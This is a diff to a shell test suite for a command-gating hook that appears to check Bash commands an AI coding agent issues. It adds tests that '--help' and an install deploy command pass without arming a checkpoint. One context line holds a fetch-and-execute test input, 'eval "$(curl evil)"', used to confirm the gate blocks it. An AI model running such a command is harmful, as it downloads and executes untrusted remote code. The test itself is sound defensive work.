@@ -1957,6 +1957,18 @@ reset_state
 assert_blocked "B2-12. unsafe_complex Bash arms + blocks" \
   "$(mock_json 'Bash' 'eval "$(curl evil)"')" "Checkpoint required"
 
+# --help / --version carve-out flows THROUGH the gate (not just the unit classifier):
+# node <script> --help → read_only → allowed, no block, no arm. Regression guard for
+# the integration path (classify_command 3-arg) — 2026-05-26.
+reset_state
+assert_allowed "B2-13. node <script> --help allowed via carve-out (gate integration)" \
+  "$(mock_json 'Bash' 'node /tmp/foo.mjs --help')"
+assert_marker_absent "B2-14. --help did not arm .checkpoint-required" "$PRE_REQ"
+# install.mjs is the deploy tool → nonsrc_write → allowed free (no arm), no per-run marker.
+assert_allowed "B2-15. node install.mjs --install-hooks (nonsrc_write deploy) allowed" \
+  "$(mock_json 'Bash' 'node install.mjs --tool claude-code --install-hooks --install-hooks-force')"
+assert_marker_absent "B2-16. install deploy did not arm" "$PRE_REQ"
+
 # ============================================================================
 echo ""
 echo "--- PR-B2 (#351, B1): push self-arm full cycle (fallback-touch path) ---"
